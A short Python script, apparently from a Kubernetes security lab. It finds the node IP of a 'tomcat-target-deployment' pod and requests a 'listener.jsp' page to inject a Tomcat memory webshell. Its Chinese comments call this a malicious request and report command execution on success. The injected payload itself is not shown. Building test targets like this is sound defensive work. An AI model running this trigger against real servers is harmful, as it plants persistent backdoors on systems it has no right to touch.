import time
import requests
import subprocess


def get_pod_cluster_ip():
    pods = subprocess.check_output(['kubectl', 'get', 'pods', '-n', 'xinfan', '-o', 'wide'],
                                   stderr=subprocess.STDOUT).decode()
    lines = pods.split('\n')
    for line in lines:
        if 'tomcat-target-deployment' in line.split()[0]:
            if line.split()[3] == "0":
                target_node = line.split()[6]
                nodes = subprocess.check_output(['kubectl', 'get', 'nodes', '-o', 'wide'],
                                                stderr=subprocess.STDOUT).decode()
                nodes_lines = nodes.split('\n')
                for nodes_line in nodes_lines:
                    if target_node in nodes_line.split()[0]:
                        return nodes_line.split()[5]
            else:
                target_node = line.split()[8]
                nodes = subprocess.check_output(['kubectl', 'get', 'nodes', '-o', 'wide'],
                                                stderr=subprocess.STDOUT).decode()
                nodes_lines = nodes.split('\n')
                for nodes_line in nodes_lines:
                    if target_node in nodes_line.split()[0]:
                        return nodes_line.split()[5]
    return None


# 这个方法用来发送恶意请求
def send_memshell_request():
    cluster_ip = get_pod_cluster_ip()
    if cluster_ip is None:
        print("\033[91m>>无法获取集群IP\033[0m")
        return
    url = f"http://{cluster_ip}:30088/memtest/listener.jsp"
    try:
        response = requests.get(url)
        if 'Inject Success' in response.text:
            print("\033[92m>>内存马连接执行命令成功，5s后终止进程\033[0m")
            time.sleep(5)
        else:
            print("\033[91m>>内存马连接执行命令失败\033[0m")
    except requests.exceptions.RequestException as e:
        print("\033[91m>>内存马连接执行命令失败: ", e, "\033[0m")
